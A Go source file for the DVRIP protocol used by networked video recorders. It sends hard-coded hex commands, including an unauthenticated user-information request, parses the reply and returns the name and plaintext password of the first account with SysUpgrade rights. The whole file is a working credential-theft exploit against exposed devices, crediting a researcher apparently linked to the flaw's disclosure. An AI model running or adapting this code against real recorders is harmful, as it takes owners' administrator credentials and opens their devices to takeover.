package dvrip

import (
	"bytes"
	"encoding/hex"
	"encoding/json"
	"errors"
	"net"
	"slices"
	"strings"
	"time"
)

// NetSecFish <3
var commands = []string{
	"ff00000000000000000000000000f103250000007b202252657422203a203130302c202253657373696f6e494422203a202230783022207d0aff00000000000000000000000000ac05300000007b20224e616d6522203a20224f5054696d655175657279222c202253657373696f6e494422203a202230783022207d0a", // Initial command
	"ff00000000000000000000000000ee032e0000007b20224e616d6522203a20224b656570416c697665222c202253657373696f6e494422203a202230783022207d0a",                                                                                                                       // KeepAlive
	"ff00000000000000000000000000c00500000000", // Users Information
	"ff00000000000000000000000000fc032f0000007b20224e616d6522203a202253797374656d496e666f222c202253657373696f6e494422203a202230783022207d0a",   // Device Information
	"ff00000000000000000000000000fc03300000007b20224e616d6522203a202253746f72616765496e666f222c202253657373696f6e494422203a202230783022207d0a", // Storage Information
}

func receiveAll(conn net.Conn) ([]byte, error) {
	var data []byte
	var buf = make([]byte, 1024)

	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))

	for {
		n, err := conn.Read(buf)
		if err != nil {
			return data, err
		}

		data = append(data, buf[:n]...)

		if len(data) >= 2 && data[len(data)-2] == '\x0a' && data[len(data)-1] == '\x00' {
			break
		}
	}

	return data, nil
}

func parseUserResponse(response []byte) (*UsersResponse, error) {
	var parsedData = new(UsersResponse)

	startIndex := bytes.IndexByte(response, '{')
	endIndex := bytes.LastIndexByte(response, '}')

	// we check if we could get the json response
	if startIndex == -1 || endIndex == -1 || startIndex > endIndex {
		return nil, errors.New("invalid json format")
	}

	// unmarshal data in users response struct
	if err := json.Unmarshal(response[startIndex:endIndex+1], &parsedData); err != nil {
		return nil, err
	}

	return parsedData, nil
}

func getUserData(conn net.Conn) (*UsersResponse, error) {
	for _, command := range commands {
		// Decode command and write data
		data, _ := hex.DecodeString(command)
		if _, err := conn.Write(data); err != nil {
			continue
		}

		// Attempt to receive data
		response, err := receiveAll(conn)
		if err != nil {
			continue
		}

		// Check if it contains AuthorityList (which is the user response)
		if !strings.Contains(string(response), "AuthorityList") {
			continue
		}

		// finally parse info
		return parseUserResponse(response)
	}

	return nil, errors.New("no authority found")
}

// RetrieveFirstUser will get the first user with SysUpgrade permissions
func RetrieveFirstUser(conn net.Conn) (string, string, error) {
	response, err := getUserData(conn)
	if err != nil {
		return "", "", err
	}

	if response == nil || response.Users == nil {
		return "", "", errors.New("no")
	}

	for _, user := range response.Users {
		if slices.Contains(user.AuthorityList, "SysUpgrade") {
			return user.Name, user.Password, nil
		}
	}

	return "", "", errors.New("no")
}
